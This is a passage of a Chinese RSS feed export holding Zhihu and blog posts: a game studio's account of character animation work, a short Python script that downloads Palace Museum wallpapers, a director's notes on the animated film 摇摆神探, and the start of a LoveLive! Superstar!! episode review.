data-private-watermark-src=\"\"></p>\n<p><b>刚完成的建模就像一个木偶，</b></p>\n<p><b>而动画师为木偶赋予骨架和灵活的关节，</b></p>\n<p><b>并通过软件连上看不见的线，</b></p>\n<p><b>用一套动作使木偶变得生动起来。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4c3b4ac775b16f4e5e4dfc3edaec3bb4_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"615\" data-rawheight=\"317\" data-watermark=\"original\" data-original-src=\"v2-4c3b4ac775b16f4e5e4dfc3edaec3bb4\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>成套动作的设计是展现角色个性的关键。</b></p>\n<p>因此在设计之初，</p>\n<p>团队成员同样会展开脑暴会议，</p>\n<p>讨论并进行多轮提案，</p>\n<p>而动画师会根据这些提案去制作出多版可视化设计稿，</p>\n<p>也被称为动作示意。</p>\n<p><br></p>\n<p>在动作示意环节，</p>\n<p><b>动画师首先会利用建模师提供的粗模来进行绑定蒙皮，</b></p>\n<p><b>也就是为皮肤模型搭建一个完整的骨架，</b></p>\n<p><b>并将骨架嵌入到皮肤模型里，</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-52627a55e4c3ed72266dc000aec634d0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1429\" data-rawheight=\"771\" data-watermark=\"original\" data-original-src=\"v2-52627a55e4c3ed72266dc000aec634d0\" data-watermark-src=\"v2-b5ec4380fce208c7955918340cd3d7ca\" data-private-watermark-src=\"v2-f882d6bac663d140bad9ffaa2f1603e1\"></p>\n<p><b>经过绑定蒙皮，</b></p>\n<p><b>模型也就有了动起来的可能。</b></p>\n<p>此时的动作示意仍是比较粗糙生硬的，</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6f7c4d2feabe203a23d87fe86646162b_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"673\" data-rawheight=\"356\" data-watermark=\"original\" data-original-src=\"v2-6f7c4d2feabe203a23d87fe86646162b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>但在经过团队成员投票通过之后，</p>\n<p><b>动画师就会将粗模替换成最终模型，</b></p>\n<p><b>进入更细致的动作打磨环节。</b></p>\n<p><br></p>\n<p>在这一环节，</p>\n<p>动画师先要考虑的是，</p>\n<p>如何让角色的一举一动符合逻辑，</p>\n<p>符合背景故事设定，</p>\n<p><b>因此动画师会配合场景师，</b></p>\n<p><b>为动作构建一个合适的舞台环境，</b></p>\n<p><b>进一步去考虑登场动作的表演细节</b></p>\n<p><b>以及动作衔接的流畅自然</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ce1a3d1ef5fa1c233e6e6f98ea9135a6_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"673\" data-rawheight=\"356\" data-watermark=\"original\" data-original-src=\"v2-ce1a3d1ef5fa1c233e6e6f98ea9135a6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>所谓动作衔接的流畅自然</b></p>\n<p><b>也就是角色的运动符合人体动力学，</b></p>\n<p><b>不会给人一种违和感，</b></p>\n<p><b>即使是卡通风格，</b></p>\n<p><b>也要结合科学常识进行艺术加工。</b></p>\n<p><br></p>\n<p>比如当一个角色从高空中落地</p>\n<p>如果没有一个自然的身体起伏作为缓冲，</p>\n<p>也显然是不符合常识的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4081201f0bd1a5100987e5d9844ce027_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"673\" data-rawheight=\"356\" data-watermark=\"original\" data-original-src=\"v2-4081201f0bd1a5100987e5d9844ce027\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>这些自然生动的细节，</b></p>\n<p><b>都十分考验动画师的阅历和想象力。</b></p>\n<p><br></p>\n<p>遇到专业领域的武术和舞蹈动作，</p>\n<p>动画师也要寻找大量的参考资料，</p>\n<p>在专业软件中不断进行模拟，</p>\n<p>才能编排出一段逼真的动作演绎。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-24de7752fb19a2610d51de7c2c93d578_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"679\" data-rawheight=\"373\" data-watermark=\"original\" data-original-src=\"v2-24de7752fb19a2610d51de7c2c93d578\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>有时，动画师也会借助真人动作捕捉技术，</b></p>\n<p><b>来制作写实风格的动画。</b></p>\n<p><br></p>\n<p>比如“上官婉儿·梁祝”皮肤，</p>\n<p>就邀请了越剧专家进行表演，</p>\n<p>并通过光学动捕，</p>\n<p>将真人动作复刻到皮肤模型上，</p>\n<p><img src=\"https://pic2.zhimg.com/v2-50ab030a995ba6e608ff8980a41d5805_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"679\" data-rawheight=\"373\" data-watermark=\"original\" data-original-src=\"v2-50ab030a995ba6e608ff8980a41d5805\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>除了肢体动作，</b></p>\n<p><b>面部表情对增强感染力同样至关重要。</b></p>\n<p><br></p>\n<p>比如在“程咬金·功夫厨神”的动作中，</p>\n<p>动画师就加入了享受、陶醉、自信等六个表情，</p>\n<p>结合人物浮夸的动作，</p>\n<p>增强表现的真实性和趣味性。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6eef0527064bcba3fa2c57215573f2e0_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"727\" data-rawheight=\"406\" data-watermark=\"original\" data-original-src=\"v2-6eef0527064bcba3fa2c57215573f2e0\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>随着技术的进步与表现技法的迭代</b></p>\n<p><b>动画师也会运用影视化的镜头语言，</b></p>\n<p>比如镜头的推拉摇移，</p>\n<p>场景的分切组接，</p>\n<p><b>从最佳方位来展现模型和动作的美感，</b></p>\n<p><b>增强叙事的沉浸感</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ee1531a5df0cbd362c5be5f08d50f780_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"727\" data-rawheight=\"331\" data-watermark=\"original\" data-original-src=\"v2-ee1531a5df0cbd362c5be5f08d50f780\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>综上，</b></p>\n<p><b>要想成为一名游戏角色动画师，</b></p>\n<p><b>最好需要：</b></p>\n<p>足够的美术素养、</p>\n<p>动画节奏感、</p>\n<p>2D、3D引擎制作经验、</p>\n<p>较强的自学能力、</p>\n<p>表演艺术经验、</p>\n<p>Maya、3dmax、MotionBuilder等软件知识、</p>\n<p>对动捕技术的了解</p>\n<p>......</p>\n<p><br></p>\n<p>不提了，又得去学技术了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-10609283503d273e2ab5df0d83f831d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"205\" data-rawheight=\"234\" data-watermark=\"original\" data-original-src=\"v2-10609283503d273e2ab5df0d83f831d9\" data-watermark-src=\"v2-270f00905e7b9a300020511551b963ed\" data-private-watermark-src=\"v2-2f175bf4aa6e044f8f78c0bc6b40e63a\"></p>\n<p>后续还有关于特效设计师、UI设计师、美宣设计师的故事，</p>\n<p>视反响持续更新！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-97fe54cb99adf840f79b4a1e87eba033_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"219\" data-rawheight=\"211\" data-watermark=\"original\" data-original-src=\"v2-97fe54cb99adf840f79b4a1e87eba033\" data-watermark-src=\"v2-ba681b6a7826e37dbb51666272c392ad\" data-private-watermark-src=\"v2-5595038ecc466fdcf37adbcf3f8f3744\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tian-mei-gong-zuo-shi-21?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">腾讯天美工作室群</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/356482357/answer/2002965423?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">49 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/449240443?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在小型游戏公司做原画有意义吗?</a><br><a href=\"http://www.zhihu.com/question/315849150?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">现在学场景原画还是学好3D工作稳定了再学场景原画呢？</a><br>\n","link":"http://www.zhihu.com/question/356482357/answer/2002965423?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"如何评价动画电影《摇摆神探》？","date":"2021-07-16 15:30:10","description":"\n<p>感谢邀约，由我导演的动画电影《摇摆神探》明天7月17日就要上映了，回想当时为什么会做这部电影、还有团队创作中的过程的很多人，很多事、感受颇多，想和大家分享一些创作这部电影时的初衷。《摇摆神探》以摇摇车为主⾓的动画电影，讲的是⼀辆幻想自己是“英雄”的、与众不同的摇摇车“摇摆”是如何从绑匪⼿中营救男孩“小奇”的历险故事。电影概念是以儿童守护陪伴的主题， 创作初衷，是希望向传递，孩子童年成长过程中不可或缺的亲情守护陪伴……</p>\n<p>以下内如部分略微涉及剧透：</p>\n<p>男孩“⼩奇”和摇摇车“摇摆”是在游乐园相遇，原本一家人相约游乐场，父母又因工作中途缺席，小奇自己进入了游乐场，却被早有预谋的绑匪盯上。</p>\n<p><b>游乐园形单影只的男孩，像是是当下很多家庭现状的影子……</b>男孩“⼩奇”的⽗母整体忙于工作，对他疏于陪伴，这像是当今很多家庭的现状：每个孩子的童年都一段短暂、宝贵、独特的成长时光，这段时光的亲情陪伴对孩子的成长塑造不可或缺，孩子也会因缺乏这份陪伴而孤独。 </p>\n<p>影片中，在男孩小奇生日当天，原本一家⼈相约游乐园，⽗母却又因⼯作忙碌中途缺席。虽然父母日常忙于事业，早已在物质方面为小奇配备了高端玩具、电子设备、保镖看护等等，大多数人看来孩子这样的童年生活已经很丰富了。然而，成长路上长期缺乏陪伴的孩子并不会真正的快乐，大人们时常因忙碌难以倾听孩子内心的真实感受、容易忽视孩子渴望陪伴的诉求。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a3f62cc80cfd0b169360aa775591626c_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5713\" data-rawheight=\"2480\" data-watermark=\"watermark\" data-original-src=\"v2-a3f62cc80cfd0b169360aa775591626c\" data-watermark-src=\"v2-d600674d86c242832e7de0b6ac3c77d3\" data-private-watermark-src=\"v2-c03f7ddda729d85b175130fd20b487d9\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-852324bb7142fa5d01e9dacce5c4c1ab_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-852324bb7142fa5d01e9dacce5c4c1ab\" data-watermark-src=\"v2-6bb8ea6f29136a63847e99825c125280\" data-private-watermark-src=\"v2-bdd62cf3f8a6316ebfbde891b96e7bf2\"></p>\n<p>顺带插一句：男孩小奇的形象设计，参考并融合了现实中多位明星童年出道时的样子，大家觉得像哪一位？</p>\n<p>原本一场全家人欢乐的游玩，父母却突然缺席，此刻小奇仍然是孤独的，但男孩不理解自己不开心的深层原因，而是选择了自己去寻找答案：小男孩不知不觉独自来到了游乐园……他在游乐园遇见了很多新奇好玩的设施玩具、也遇到了其他陪伴孩子玩耍的三口之家，更遇见了童年的摇摇车，回忆起很小的时候自己坐在摇摇车上，父母在旁陪伴嬉闹的情形。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9a95645d7315142ef52fe47e672a9b0f_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-9a95645d7315142ef52fe47e672a9b0f\" data-watermark-src=\"v2-549e78a6df9bf5898adb1483127fa83f\" data-private-watermark-src=\"v2-f83f67373c83ace25abc773adfe3e9b1\"></p>\n<p><br></p>\n<p>这段电影剧情，男孩小奇与神奇摇摇车“摇摆”看似不期而遇，实则充满必然！因为游乐园往往正是孩子在家人陪伴下的游玩场所，这种亲情陪伴是小奇内心潜在的强烈诉求，而这些看似简单的童年守护陪伴正是当今的孩子、父母所需的。</p>\n<p>在电影后续剧情中，男孩遭遇绑匪，摇摇车挺身而出开展营救，他们一起与坏人在游乐园展开周旋，开启了一场紧张而欢乐的冒险。摆脱危险困境后，在傍晚落日下的海边沙滩，摇摇车更化身为男孩的快乐陪伴担当。此时此刻，摇摇车“摇摆”所扮演的守护孩子安全、暖心欢乐陪伴等等一系列举动，不正是父母在孩子童年成长中不可或缺的守护陪伴？</p>\n<p><b>这段摇摇车营救故事，想传递童年里不可或缺的亲情守护陪伴  </b>如今快生活节奏大环境下，家庭娱乐的方式越来越多，很多父母也愈加习惯用物质方式解决孩子成长路上的问题，如更智能的玩具、早教、电子产品等等，在这样的大环境下，孩子也在快速成长并学会自己解决问题、寻找答案。如之前说的，每个孩子的童年都一段短暂、宝贵、独特的成长时光，而这段父母亲情守护陪伴的记忆和对孩子的影响，即使多年后孩子长大了仍然深刻……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0577e9724a33c970a67af88dc58ab999_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1409\" data-rawheight=\"748\" data-watermark=\"watermark\" data-original-src=\"v2-0577e9724a33c970a67af88dc58ab999\" data-watermark-src=\"v2-41fa95c1423c730ca0b565e5802ba6c8\" data-private-watermark-src=\"v2-d49e029ed11dce689a07615580f2b1c9\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c1fcecbac6e7d5e0206e1d3a1b4c3342_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-c1fcecbac6e7d5e0206e1d3a1b4c3342\" data-watermark-src=\"v2-a35d08dc42c66ddd638a9cc2d4cff43c\" data-private-watermark-src=\"v2-4ff692503e44957b486a01b7b54ce898\"></p>\n<p>我本人是79年的、还有编剧邓伟峰等创作团队成员都是80后，其实吧，那个年代的孩子大多经历过类似的童年孤独状态：比如父母忙于工作、时常让孩子一个人在家，因为大多是独生子，孩子本就缺少兄弟姐妹成长陪伴、却常与玩具作伴……</p>\n<p>在那个电子娱乐缺乏的年代，虽然没有当下那么丰富的娱乐方式，但对童年成长过程中、那段父母陪伴的记忆都尤为深刻！那时候的童年快乐很简单，即使父母偶尔陪孩子公园玩一天，真的能高兴很久很久</p>\n<p> 《摇摆神探》讲的是神奇摇摇车去营救男孩的欢乐冒险故事，而电影想传递的童年守护陪伴、不只是守护儿童的身心安全，更是孩子成长路上不可或缺的父母亲情陪伴！这年头啊，每个家庭在品类繁杂的城市娱乐中有了更多选择，父母陪孩子玩摇摇车的情形小时候到时很常见到……现在还多吗?</p>\n<p>这一次，曾经陪伴无数人童年的摇摇车在电影里“活”了，我想对于很多像我们这样的大孩子来说也算是一种童年追忆吧。</p>\n<p>好了 ，不知不觉说了那么多  ，我们在设计摇摇车“摇摆”的故事时出过很多有趣的想法，感触很多，看着大伙做了这么久的片子明天就要上映了，希望大家喜欢，可能会从中回忆起什么也说不定，希望大家都能从中得到快乐</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhu-jiang-6-41?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">凨木猪</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469062064/answer/2002161426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20685563?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">电影《神探》中刘青云看到人心里的鬼，为什么出主意的都是女性？</a><br><a href=\"http://www.zhihu.com/question/49325102?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价香港电影《神探》？</a><br>\n","link":"http://www.zhihu.com/question/469062064/answer/2002161426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021七月新番《LoveLive! Superstar!!》？","date":"2021-07-16 11:30:10","description":"\n<p>星团的第一集从我个人的角度来说，属于是那种你能感受到许多不同于正面战场前两作，能够一些新鲜空气的单集;是能感受到在虹色游击队(虹咲企划在所谓法统层面上相对缺少一些继承关系)与法统爱生活完成统一战线与法统梳理下，虹军游击队的讲习所对正面战场带来积极作用的单集。</p>\n<p>但是星团的第一集同样让我觉得是一个在新鲜感褪去进入到激情的思考时会怀疑是否真的在起点完成了一部分革新的单集;是察觉到结构变化反倒很大程度上影响到作品情绪抒发与剧情感官的单集;也是总感觉缺少一块足够的长板去让人忘记不足的单集。</p>\n<p><b>总结性的预言一下，我觉得星团既很可能是法统核心里最适合于今天的那一个，也很可能成为爱生活系列的“清末新政”的那一个，但基本不可能完成达到为爱生活系列带来各种积极方面大幅扭转的那一个，能不能赶上虹色游击队都需要祈祷花田能在自己擅长的方向发挥正常＋企划本身的条条框框能少一点以及足够的配置与运气。（注：笔者真不懂爱生活，没玩过LLAS，虽然奉行雨野罪大恶极但是也不算熟悉剧情，一切对照都基于动画本体）</b></p>\n<hr>\n<ol>\n<li><b>告别了废校废部是否意味着改变了启动机制？？</b></li>\n<li><b>当传统的中段变成开头时，能否得到足够的回应？</b></li>\n<li><b>鲤鱼，此刻最大的短板，却不只是她的问题</b></li>\n<li><b>其他与总结</b></li>\n</ol>\n<h2>1.告别了废部废校是否意味着改变了启动机制？</h2>\n<p>许多朋友在谈论星团的第一集的时候，都会以本作第一集没有再提废部废校设定而把这个作为一个巨大的突破，emmmm，也许在玩梗方面你说的对，但是小声说一句:<b>《lovelive sunshine》的第一集也没有废部废校，类似的内容也只有学生会会长断然拒绝，果南对此支支吾吾。</b>而在星团第一集中，同样有学生会长严词拒绝，能否说真的告别了都难说。</p>\n<p>而且比形制上的废校废部来说，我们首先应该来看待另外一个问题：“在LL系列之中，被视为模板套皮的废部废校，是否每一次都起到了相似的作用，是否都是启动机制的一部分”。</p>\n<p>在缪中，的确音乃木阪的废校与为了让新入学人数增加而创办学园偶像部成为了果皇一切的切入点与传奇的起点。但是，不论是后续LLSS的浦女，还是虹咲会展中心兼国际机场，作品本身切入到学园偶像的起点本质上都是一个——<b>“薪火相传的感染力”</b>。</p>\n<p>浦女的学园偶像部的remake，其由头是蜜柑姐被缪斯的歌舞给dokidoki了，在蜜柑姐强大的精神属性与“死皮赖脸”的安利之下，成功将事态与旧有传统体系性危机——废校结合，同时击鼓传花一般的将问题切入到三年级三人组的旧有恩怨情仇。从复盘的角度，我们当然应该说，浦女的废校危机当然在在你水的重启中起到了重要作用，但是从整个启动机制来看，由头已经从缪系列废校废部为基础与源动力变成了一种戏剧性与偷梗的部分。在我看来，如果将有无废校废部就看做机制改进，那么我觉得将废校废部进行弱化矛盾，取消其核心源头的水团其实已经在reform的道路上走了一大步，甚至很大程度上，就第一集的启动逻辑来看，星团其实高度继承地是水团（但是确实在一些不常提到的地方有了不小变化）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-13b5d6b4792968990f9f5243abafdce5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-13b5d6b4792968990f9f5243abafdce5\" data-watermark-src=\"v2-ec326f5b9cb84a1bf1ce34da4b969f49\" data-private-watermark-src=\"v2-febe000c23ef8e40a27556a2cc1d2142\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-54e06a73c8de0f664f39496e9970672b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-54e06a73c8de0f664f39496e9970672b\" data-watermark-src=\"v2-6aea0214462003637922d04001aeaaa6\" data-private-watermark-src=\"v2-40752a86f1fdd93d55166bfef1db06a0\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-786249486f38cfe2e3c265d20e9b466f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-786249486f38cfe2e3c265d20e9b466f\" data-watermark-src=\"v2-f2de123a7ef3ebfd706ae8851875617d\" data-private-watermark-src=\"v2-d55eb819c80f86df33927c4972be31e0\"></p>\n<p>在启动机制方面，虹色游击队在我看来事实上算是我眼中改革更激进的那一个，但这一点也是因为其组织结构方面的完全差异性带来的，即“相较于缪的从零开始，水的断代重建，虹团动画的起点便是虹咲学园偶像同好会的骤然废部，此时其旧有框架完全保留，并不需要再上井冈山”。</p>\n<p>所以虹团的剧情起点是侑和步梦的闲聊逛街，被雪菜精彩的表现所感染而完成的传承，此处相当程度上继承了水团以来利用传承去构建由头的逻辑。但在本集按照一般校园社团番中的纠结与自我说服附带上废部的戏剧性之后，本集除去百合气息外最有特色的便是因为本集的节点选择，让其最后能以一串足够漂亮的群像剧剪影将同好会旧部的情况与废部的紧急事态相结合，甚至最后也因此将虹团第二集拍成了《第五共和国》似的小霞霞另立核心，带来了许多真正配得上意想不到却在合理之中充满着喜剧意味的戏剧性玩意儿。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a2496734361887379a6e6275b6b68067_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-a2496734361887379a6e6275b6b68067\" data-watermark-src=\"v2-00efedd306ea72afe77d59c49a754d62\" data-private-watermark-src=\"v2-4408c68a348bed89bd687bd190a45439\"></p>\n<p>那么星团呢？从第一集来看，至少从团队的启动层面来看，星团的启动机制近乎完全继承了水团以来<b>感染力的继承</b>这一核心逻辑，也与水团一样在主要矛盾尚未出现之时，便已经因为某一个“传教士”开启了剧情的运转，只不过这一次属于是西风东渐了（毕竟沪国当然在你日西边）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9742d758830a8206178c3af74514ef9a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-9742d758830a8206178c3af74514ef9a\" data-watermark-src=\"v2-36e005bd9007d171e271d03e5fb2c983\" data-private-watermark-src=\"v2-f15e66917a120210ba5a2cdada24875f\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dd79f0e54af8a12fa19b8dd706d2724c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-dd79f0e54af8a12fa19b8dd706d2724c\" data-watermark-src=\"v2-81475b6ece48eb93749770882d631192\" 